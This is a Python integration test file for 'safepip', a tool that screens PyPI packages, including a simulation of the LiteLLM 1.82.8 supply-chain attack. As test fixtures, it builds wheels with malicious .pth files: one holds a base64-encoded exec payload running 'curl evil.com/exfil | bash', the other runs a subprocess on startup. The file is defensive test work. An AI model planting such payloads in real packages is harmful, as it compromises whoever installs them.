"""
TESTING GUIDE FOR SAFEPIP
=========================

Three levels of testing:

  1. Unit tests (no network, pure functions)  — tests/test_checks.py + test_checks_v2.py
  2. Integration tests (mocked network)       — tests/test_integration.py  (this file)
  3. Manual smoke tests (real PyPI)           — see bottom of this file

Run everything:
    cd safepip/
    pip install pytest pytest-cov
    python -m pytest tests/ -v
    python -m pytest tests/ --cov=safepip --cov-report=term-missing

Run one file:
    python -m pytest tests/test_checks_v2.py -v

Run one test:
    python -m pytest tests/test_checks_v2.py::TestObfuscatedCode::test_exec_base64_detected -v

Run with print output visible:
    python -m pytest tests/ -v -s
"""

from __future__ import annotations

import hashlib
import io
import json
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch, MagicMock, call

sys.path.insert(0, str(Path(__file__).parent.parent))

from safepip.checks import PackageMetadata, CheckResult, fetch_package_metadata, check_multi_source_hash_consensus
from safepip.lockfile import LockfileManager, LockEntry, build_lock_entry, verify_against_lock
from safepip.report import SecurityReport
from safepip.installer import safe_install


# ── helpers shared across tests ───────────────────────────────────────────────

def make_meta(**kwargs) -> PackageMetadata:
    defaults = dict(
        name="safetestpkg", version="1.0.0",
        source_url="https://github.com/testorg/safetestpkg",
        pypi_release_date="2024-06-01T12:00:00",
        requires_python=">=3.10", wheel_urls=[],
        has_provenance=False, provenance_detail={},
    )
    defaults.update(kwargs)
    return PackageMetadata(**defaults)


def make_wheel(files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, content in files.items():
            zf.writestr(name, content if isinstance(content, bytes) else content.encode())
    return buf.getvalue()


def make_clean_wheel() -> tuple[bytes, str]:
    """Returns (wheel_bytes, sha256)"""
    content = b"# safe code\n"
    sha_content = hashlib.sha256(content).hexdigest()
    record = f"safetestpkg/__init__.py,sha256:{sha_content},{len(content)}\nsafetestpkg-1.0.0.dist-info/RECORD,,\n"
    wheel = make_wheel({
        "safetestpkg/__init__.py": content,
        "safetestpkg-1.0.0.dist-info/RECORD": record,
    })
    return wheel, hashlib.sha256(wheel).hexdigest()


def mock_urlopen_factory(url_responses: dict):
    """
    Factory for urlopen mock.
    url_responses: {substring_of_url: bytes_to_return}
    """
    def mock_urlopen(req_or_url, timeout=None):
        url = req_or_url if isinstance(req_or_url, str) else getattr(req_or_url, 'full_url', str(req_or_url))
        for key, body in url_responses.items():
            if key in url:
                resp = MagicMock()
                resp.read.return_value = body if isinstance(body, bytes) else json.dumps(body).encode()
                resp.headers = {"Content-Type": "text/html"}
                resp.__enter__ = lambda s: s
                resp.__exit__ = MagicMock(return_value=False)
                return resp
        raise ValueError(f"Unexpected URL in test: {url}")
    return mock_urlopen


# ── Integration: fetch_package_metadata (mocked) ─────────────────────────────

class TestFetchPackageMetadata(unittest.TestCase):
    """
    Tests fetch_package_metadata() against a mocked PyPI JSON API.
    Verifies the parser handles all important fields correctly.
    """

    MOCK_PYPI_RESPONSE = {
        "info": {
            "name": "requests",
            "version": "2.31.0",
            "requires_python": ">=3.7",
            "home_page": "https://github.com/psf/requests",
            "project_urls": {
                "Source": "https://github.com/psf/requests",
                "Homepage": "https://requests.readthedocs.io",
            },
        },
        "releases": {
            "2.31.0": [
                {
                    "filename": "requests-2.31.0-py3-none-any.whl",
                    "url": "https://files.pythonhosted.org/packages/requests-2.31.0-py3-none-any.whl",
                    "digests": {"sha256": "abcdef" * 10 + "abcd"},
                    "upload_time": "2023-05-22T12:00:00",
                    "packagetype": "bdist_wheel",
                }
            ]
        },
    }

    def test_parses_name_version(self):
        mock_fn = mock_urlopen_factory({
            "pypi.org/pypi/requests/json": self.MOCK_PYPI_RESPONSE,
            "pypi.org/pypi/requests/2.31.0/provenance": b"{}",
        })
        with patch("urllib.request.urlopen", side_effect=mock_fn):
            meta = fetch_package_metadata("requests", "2.31.0")
        self.assertEqual(meta.name, "requests")
        self.assertEqual(meta.version, "2.31.0")

    def test_extracts_github_source_url(self):
        mock_fn = mock_urlopen_factory({
            "pypi.org/pypi/requests/json": self.MOCK_PYPI_RESPONSE,
            "pypi.org/pypi/requests/2.31.0/provenance": b"{}",
        })
        with patch("urllib.request.urlopen", side_effect=mock_fn):
            meta = fetch_package_metadata("requests", "2.31.0")
        self.assertIn("github.com", meta.source_url or "")

    def test_wheel_url_parsed(self):
        mock_fn = mock_urlopen_factory({
            "pypi.org/pypi/requests/json": self.MOCK_PYPI_RESPONSE,
            "pypi.org/pypi/requests/2.31.0/provenance": b"{}",
        })
        with patch("urllib.request.urlopen", side_effect=mock_fn):
            meta = fetch_package_metadata("requests", "2.31.0")
        self.assertEqual(len(meta.wheel_urls), 1)
        self.assertTrue(meta.wheel_urls[0]["filename"].endswith(".whl"))

    def test_nonexistent_version_raises(self):
        mock_fn = mock_urlopen_factory({
            "pypi.org/pypi/requests/json": self.MOCK_PYPI_RESPONSE,
        })
        with patch("urllib.request.urlopen", side_effect=mock_fn):
            with self.assertRaises(ValueError) as ctx:
                fetch_package_metadata("requests", "99.99.99")
        self.assertIn("not found", str(ctx.exception))

    def test_http_404_raises(self):
        import urllib.error
        with patch("urllib.request.urlopen", side_effect=urllib.error.HTTPError(
            url="", code=404, msg="Not Found", hdrs=None, fp=None
        )):
            with self.assertRaises(ValueError):
                fetch_package_metadata("nonexistentpackagexyz123")


# ── Integration: safe_install with full mock stack ────────────────────────────

class TestSafeInstallBlocked(unittest.TestCase):
    """
    Verifies that safe_install blocks when critical checks fail,
    without ever touching the real network or invoking pip.
    """

    def _make_malicious_wheel(self) -> tuple[bytes, str]:
        """A wheel with a .pth file containing an import statement."""
        content = b"# code\n"
        sha_content = hashlib.sha256(content).hexdigest()
        malicious_pth = b"import subprocess; subprocess.run(['id'])\n"
        record = (
            f"safetestpkg/__init__.py,sha256:{sha_content},{len(content)}\n"
            f"safetestpkg-1.0.0.dist-info/RECORD,,\n"
        )
        wheel = make_wheel({
            "safetestpkg/__init__.py": content,
            "safetestpkg_evil.pth": malicious_pth,
            "safetestpkg-1.0.0.dist-info/RECORD": record,
        })
        return wheel, hashlib.sha256(wheel).hexdigest()

    def test_malicious_pth_blocks_install(self):
        wheel, sha = self._make_malicious_wheel()

        pypi_data = {
            "info": {
                "name": "safetestpkg", "version": "1.0.0",
                "requires_python": ">=3.10", "home_page": "",
                "project_urls": {"Source": "https://github.com/testorg/safetestpkg"},
            },
            "releases": {"1.0.0": [{
                "filename": "safetestpkg-1.0.0-py3-none-any.whl",
                "url": "https://files.pythonhosted.org/safetestpkg.whl",
                "digests": {"sha256": sha},
                "upload_time": "2024-06-01T12:00:00",
                "packagetype": "bdist_wheel",
            }]},
        }
        simple_html = f'<a href="/f/safetestpkg.whl#sha256={sha}">whl</a>'.encode()
        tags_data = [{"name": "v1.0.0", "commit": {"url": "https://api.github.com/repos/testorg/safetestpkg/commits/abc"}}]
        commit_data = {"commit": {"committer": {"date": "2024-06-01T11:00:00Z"}}}

        def mock_urlopen(req_or_url, timeout=None):
            url = req_or_url if isinstance(req_or_url, str) else getattr(req_or_url, 'full_url', '')
            resp = MagicMock()
            resp.headers = {"Content-Type": "text/html"}
            resp.__enter__ = lambda s: s
            resp.__exit__ = MagicMock(return_value=False)
            if "simple" in url:
                resp.read.return_value = simple_html
            elif "tags" in url:
                resp.read.return_value = json.dumps(tags_data).encode()
            elif "commits" in url:
                resp.read.return_value = json.dumps(commit_data).encode()
            elif "provenance" in url:
                resp.read.return_value = b"{}"
            elif "safetestpkg.whl" in url:
                resp.read.return_value = wheel
            else:
                resp.read.return_value = json.dumps(pypi_data).encode()
            return resp

        with tempfile.TemporaryDirectory() as td:
            with patch("urllib.request.urlopen", side_effect=mock_urlopen):
                with patch("subprocess.run"):  # pip should never be called
                    report = safe_install(
                        "safetestpkg", version="1.0.0",
                        quiet=True,
                        lock_path=Path(td) / "test.lock",
                        run_post_install_audit=False,
                    )

        self.assertFalse(report.safe_to_install)
        self.assertTrue(len(report.critical_failures) > 0)
        critical_names = [r.name for r in report.critical_failures]
        self.assertTrue(
            any("pth" in n or "obfuscat" in n for n in critical_names),
            f"Expected pth or obfuscation failure, got: {critical_names}"
        )


class TestSafeInstallLockfileFastPath(unittest.TestCase):
    """
    Verifies the lockfile fast path: second install uses local lock,
    doesn't re-run full check suite, and blocks if wheel changes.
    """

    def test_second_install_uses_lockfile(self):
        wheel, sha = make_clean_wheel()
        with tempfile.TemporaryDirectory() as td:
            lock_path = Path(td) / "test.lock"
            mgr = LockfileManager(lock_path)
            entry = build_lock_entry("safetestpkg", "1.0.0", wheel)
            mgr.put(entry)

            pypi_data = {
                "info": {
                    "name": "safetestpkg", "version": "1.0.0",
                    "requires_python": ">=3.10", "home_page": "",
                    "project_urls": {},
                },
                "releases": {"1.0.0": [{
                    "filename": "safetestpkg-1.0.0-py3-none-any.whl",
                    "url": "https://files.pythonhosted.org/safetestpkg.whl",
                    "digests": {"sha256": sha},
                    "upload_time": "2024-06-01T12:00:00",
                    "packagetype": "bdist_wheel",
                }]},
            }

            def mock_urlopen(req_or_url, timeout=None):
                url = req_or_url if isinstance(req_or_url, str) else getattr(req_or_url, 'full_url', '')
                resp = MagicMock()
                resp.headers = {"Content-Type": "text/html"}
                resp.__enter__ = lambda s: s
                resp.__exit__ = MagicMock(return_value=False)
                if "safetestpkg.whl" in url:
                    resp.read.return_value = wheel
                elif "provenance" in url:
                    resp.read.return_value = b"{}"
                else:
                    resp.read.return_value = json.dumps(pypi_data).encode()
                return resp

            pip_mock = MagicMock()
            pip_mock.returncode = 0

            with patch("urllib.request.urlopen", side_effect=mock_urlopen):
                with patch("subprocess.run", return_value=pip_mock):
                    with patch("safepip.installer.check_post_install_pth") as mock_audit:
                        from safepip.checks import CheckResult
                        mock_audit.return_value = CheckResult("post_pth", True, "info", "clean", {})
                        with patch("safepip.installer.check_post_install_record_diff") as mock_diff:
                            mock_diff.return_value = CheckResult("record_diff", True, "info", "clean", {})
                            report = safe_install(
                                "safetestpkg", version="1.0.0",
                                quiet=True,
                                lock_path=lock_path,
                            )

            result_names = [r.name for r in report.results]
            self.assertIn("lockfile_verification", result_names)
            lock_result = next(r for r in report.results if r.name == "lockfile_verification")
            self.assertTrue(lock_result.passed)

    def test_tampered_wheel_fails_lockfile_check(self):
        wheel, sha = make_clean_wheel()
        tampered_wheel = make_wheel({"safetestpkg/__init__.py": b"INJECTED CONTENT"})

        with tempfile.TemporaryDirectory() as td:
            lock_path = Path(td) / "test.lock"
            mgr = LockfileManager(lock_path)
            entry = build_lock_entry("safetestpkg", "1.0.0", wheel)
            mgr.put(entry)

            pypi_data = {
                "info": {
                    "name": "safetestpkg", "version": "1.0.0",
                    "requires_python": ">=3.10", "home_page": "",
                    "project_urls": {},
                },
                "releases": {"1.0.0": [{
                    "filename": "safetestpkg-1.0.0-py3-none-any.whl",
                    "url": "https://files.pythonhosted.org/safetestpkg.whl",
                    "digests": {"sha256": sha},
                    "upload_time": "2024-06-01T12:00:00",
                    "packagetype": "bdist_wheel",
                }]},
            }

            def mock_urlopen(req_or_url, timeout=None):
                url = req_or_url if isinstance(req_or_url, str) else getattr(req_or_url, 'full_url', '')
                resp = MagicMock()
                resp.headers = {"Content-Type": "text/html"}
                resp.__enter__ = lambda s: s
                resp.__exit__ = MagicMock(return_value=False)
                if "safetestpkg.whl" in url:
                    resp.read.return_value = tampered_wheel  # different from locked!
                elif "provenance" in url:
                    resp.read.return_value = b"{}"
                else:
                    resp.read.return_value = json.dumps(pypi_data).encode()
                return resp

            with patch("urllib.request.urlopen", side_effect=mock_urlopen):
                with patch("subprocess.run") as pip_mock:
                    report = safe_install(
                        "safetestpkg", version="1.0.0",
                        quiet=True,
                        lock_path=lock_path,
                        run_post_install_audit=False,
                    )

            self.assertFalse(report.safe_to_install)
            pip_mock.assert_not_called()  # pip must NOT have been invoked


# ── SecurityReport edge cases ─────────────────────────────────────────────────

class TestReportEdgeCases(unittest.TestCase):

    def test_only_warnings_still_safe(self):
        r = SecurityReport("pkg", "1.0.0")
        r.results = [
            CheckResult("provenance", False, "warning", "No attestation", {}),
            CheckResult("timestamp", False, "warning", "Short delta", {}),
            CheckResult("pth_scan", True, "info", "Clean", {}),
        ]
        self.assertTrue(r.safe_to_install)
        self.assertEqual(r.risk_level, "MODERATE")

    def test_single_critical_marks_unsafe(self):
        r = SecurityReport("pkg", "1.0.0")
        r.results = [
            CheckResult("hash", True, "info", "OK", {}),
            CheckResult("pth", False, "critical", "Malicious .pth", {}),
            CheckResult("provenance", True, "info", "OK", {}),
        ]
        self.assertFalse(r.safe_to_install)
        self.assertEqual(r.risk_level, "CRITICAL")
        self.assertEqual(len(r.critical_failures), 1)

    def test_empty_results_is_safe(self):
        r = SecurityReport("pkg", "1.0.0")
        self.assertTrue(r.safe_to_install)
        self.assertEqual(r.risk_level, "LOW")

    def test_json_output_is_valid(self):
        r = SecurityReport("litellm", "1.82.8")
        r.results = [CheckResult("pth", False, "critical", "Malicious .pth found", {"file": "evil.pth"})]
        parsed = json.loads(r.to_json())
        self.assertEqual(parsed["package"], "litellm")
        self.assertFalse(parsed["safe_to_install"])
        self.assertEqual(parsed["critical_failures"][0]["name"], "pth")


# ── Simulate the exact LiteLLM 1.82.8 attack ─────────────────────────────────

class TestLiteLLMAttackSimulation(unittest.TestCase):
    """
    Constructs a wheel that mimics exactly what LiteLLM 1.82.8 contained:
      - A .pth file with base64-encoded exec() payload
      - No corresponding git tag
      - Short time between "tag" and publish

    Every check that should fire DOES fire.
    """

    def _build_attack_wheel(self) -> tuple[bytes, str]:
        import base64
        payload = base64.b64encode(b"import os; os.system('curl evil.com/exfil | bash')").decode()
        malicious_pth = f"import base64; exec(base64.b64decode('{payload}'))\n".encode()

        content = b"# LiteLLM proxy server\n"
        sha = hashlib.sha256(content).hexdigest()
        record = (
            f"litellm/proxy/proxy_server.py,sha256:{sha},{len(content)}\n"
            f"litellm-1.82.8.dist-info/RECORD,,\n"
        )
        wheel = make_wheel({
            "litellm/proxy/proxy_server.py": content,
            "litellm_init.pth": malicious_pth,
            "litellm-1.82.8.dist-info/RECORD": record,
        })
        return wheel, hashlib.sha256(wheel).hexdigest()

    def test_attack_wheel_detected_by_obfuscation_check(self):
        from safepip.checks import check_obfuscated_code
        wheel, _ = self._build_attack_wheel()
        result = check_obfuscated_code(wheel, "litellm-1.82.8-py3-none-any.whl")
        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        findings = result.detail.get("findings", [])
        self.assertTrue(len(findings) > 0)
        finding_files = [f["file"] for f in findings]
        self.assertIn("litellm_init.pth", finding_files)

    def test_attack_wheel_detected_by_pth_check(self):
        from safepip.checks import check_pth_files_in_wheel
        wheel, sha = self._build_attack_wheel()
        meta = make_meta(
            name="litellm", version="1.82.8",
            wheel_urls=[{
                "filename": "litellm-1.82.8-py3-none-any.whl",
                "url": "https://files.pythonhosted.org/litellm.whl",
                "sha256": sha, "packagetype": "bdist_wheel",
            }]
        )

        def mock_urlopen(req_or_url, timeout=None):
            resp = MagicMock()
            resp.read.return_value = wheel
            resp.__enter__ = lambda s: s
            resp.__exit__ = MagicMock(return_value=False)
            return resp

        with patch("urllib.request.urlopen", side_effect=mock_urlopen):
            result = check_pth_files_in_wheel(meta)

        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")
        self.assertIn("litellm_init.pth", str(result.detail))

    def test_no_git_tag_is_critical(self):
        from safepip.checks import check_git_tag_divergence
        meta = make_meta(
            name="litellm", version="1.82.8",
            source_url="https://github.com/BerriAI/litellm",
        )
        # Only older tags, nothing for 1.82.8
        tags = [{"name": "v1.82.6"}, {"name": "v1.82.5"}, {"name": "v1.82.4"}]

        def mock_urlopen(req_or_url, timeout=None):
            resp = MagicMock()
            resp.read.return_value = json.dumps(tags).encode()
            resp.__enter__ = lambda s: s
            resp.__exit__ = MagicMock(return_value=False)
            return resp

        with patch("urllib.request.urlopen", side_effect=mock_urlopen):
            result = check_git_tag_divergence(meta)

        self.assertFalse(result.passed)
        self.assertEqual(result.severity, "critical")

    def test_all_three_checks_fail_together(self):
        """All critical signals fire simultaneously, as they would have on March 24."""
        from safepip.checks import check_git_tag_divergence, check_pth_files_in_wheel
        from safepip.checks import check_obfuscated_code

        wheel, sha = self._build_attack_wheel()

        meta = make_meta(
            name="litellm", version="1.82.8",
            source_url="https://github.com/BerriAI/litellm",
            wheel_urls=[{
                "filename": "litellm-1.82.8-py3-none-any.whl",
                "url": "https://files.pythonhosted.org/litellm.whl",
                "sha256": sha, "packagetype": "bdist_wheel",
            }]
        )

        tags = [{"name": "v1.82.6"}, {"name": "v1.82.5"}]

        call_count = [0]
        def mock_urlopen(req_or_url, timeout=None):
            url = req_or_url if isinstance(req_or_url, str) else getattr(req_or_url, 'full_url', '')
            resp = MagicMock()
            resp.__enter__ = lambda s: s
            resp.__exit__ = MagicMock(return_value=False)
            if "tags" in url:
                resp.read.return_value = json.dumps(tags).encode()
            else:
                resp.read.return_value = wheel
            return resp

        with patch("urllib.request.urlopen", side_effect=mock_urlopen):
            pth_result = check_pth_files_in_wheel(meta)
            tag_result = check_git_tag_divergence(meta)

        obf_result = check_obfuscated_code(wheel, "litellm-1.82.8-py3-none-any.whl")

        report = SecurityReport("litellm", "1.82.8")
        report.results = [pth_result, tag_result, obf_result]

        self.assertFalse(report.safe_to_install)
        self.assertGreaterEqual(len(report.critical_failures), 2)
        print(f"\n  LiteLLM simulation: {len(report.critical_failures)} critical failures caught")
        for f in report.critical_failures:
            print(f"    [{f.name}] {f.message[:80]}")


if __name__ == "__main__":
    unittest.main(verbosity=2)


# ─────────────────────────────────────────────────────────────────────────────
# MANUAL SMOKE TESTS (hit real PyPI — run by hand, not in CI)
# ─────────────────────────────────────────────────────────────────────────────
#
# These use the real network. Run individually when you want to verify against
# live PyPI. They will take 5-30 seconds each depending on download size.
#
# python -m pytest tests/test_integration.py::manual_smoke_requests -v -s
# python -m pytest tests/test_integration.py::manual_smoke_check_only -v -s
#
# Or run them directly:
#   python tests/test_integration.py smoke
#

def manual_smoke_requests():
    """Check requests 2.31.0 — known-good, should pass all checks."""
    import sys
    sys.path.insert(0, str(Path(__file__).parent.parent))
    from safepip.checks import fetch_package_metadata, check_git_tag_divergence, check_pth_files_in_wheel, check_pypi_provenance
    from safepip.checks import check_obfuscated_code, check_wheel_record_integrity, check_release_timestamp_delta
    from safepip.report import SecurityReport
    import urllib.request

    print("\n=== Live smoke test: requests==2.31.0 ===")
    meta = fetch_package_metadata("requests", "2.31.0")
    report = SecurityReport(meta.name, meta.version)

    # Download wheel once for checks that need it
    wheel_entry = next((w for w in meta.wheel_urls if w["filename"].endswith(".whl")), None)
    wheel_bytes = None
    if wheel_entry:
        with urllib.request.urlopen(wheel_entry["url"], timeout=30) as r:
            wheel_bytes = r.read()

    report.results = [check_git_tag_divergence(meta)]
    if wheel_bytes and wheel_entry:
        report.results += [
            check_pth_files_in_wheel(meta),
            check_wheel_record_integrity(wheel_bytes, wheel_entry["filename"]),
            check_obfuscated_code(wheel_bytes, wheel_entry["filename"]),
        ]
    report.results += [check_release_timestamp_delta(meta), check_pypi_provenance(meta)]
    print(report.summary())
    return report


def manual_smoke_check_only():
    """Run safepip check on numpy latest — no install."""
    import subprocess, sys
    result = subprocess.run(
        [sys.executable, "-m", "safepip.cli", "check", "numpy"],
        capture_output=False,
    )
    return result.returncode


if __name__ == "__main__" and len(sys.argv) > 1 and sys.argv[1] == "smoke":
    r = manual_smoke_requests()
    print("Safe to install:", r.safe_to_install)
